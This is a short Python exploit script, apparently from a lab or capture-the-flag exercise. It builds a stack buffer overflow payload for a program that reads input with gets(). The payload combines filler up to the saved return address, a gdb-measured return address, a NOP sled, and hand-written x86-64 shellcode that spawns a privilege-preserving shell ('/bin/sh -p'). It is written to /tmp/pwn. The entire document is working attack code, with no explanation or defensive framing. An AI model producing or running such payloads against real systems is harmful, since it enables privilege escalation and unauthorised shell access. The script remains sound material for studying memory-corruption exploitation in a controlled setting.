import struct

BUF      = 0x7fffffffeca0          # measured in gdb
OFFSET   = 88
RET      = BUF + 0x50 + 8 + 8 + 128   # land mid-sled (±128 B of tolerance)

sc = bytes.fromhex(
    "4831d2"                # xor  rdx, rdx              ; envp = NULL
    "52"                    # push rdx                   ; NULL
    "48b82f62696e2f736800"  # movabs rax, "/bin/sh"
    "50"                    # push rax
    "4889e7"                # mov  rdi, rsp              ; rdi = "/bin/sh"
    "b82d700000"            # mov  eax, "-p"
    "50"                    # push rax
    "52"                    # push rdx
    "488d442408"            # lea  rax, [rsp+8]          ; &"-p"
    "50"                    # push rax                   ; argv[1]
    "57"                    # push rdi                   ; argv[0]
    "4889e6"                # mov  rsi, rsp              ; argv
    "b83b000000"            # mov  eax, 59               ; execve
    "0f05"                  # syscall
)

payload  = b"A" * OFFSET               # filler up to saved RIP
payload += struct.pack("<Q", RET)      # new return address → NOP sled
payload += b"\x90" * 256               # NOP sled
payload += sc                          # execve("/bin/sh", ["/bin/sh","-p"], NULL)
payload += b"\n"                       # terminate the gets() read
open("/tmp/pwn", "wb").write(payload)
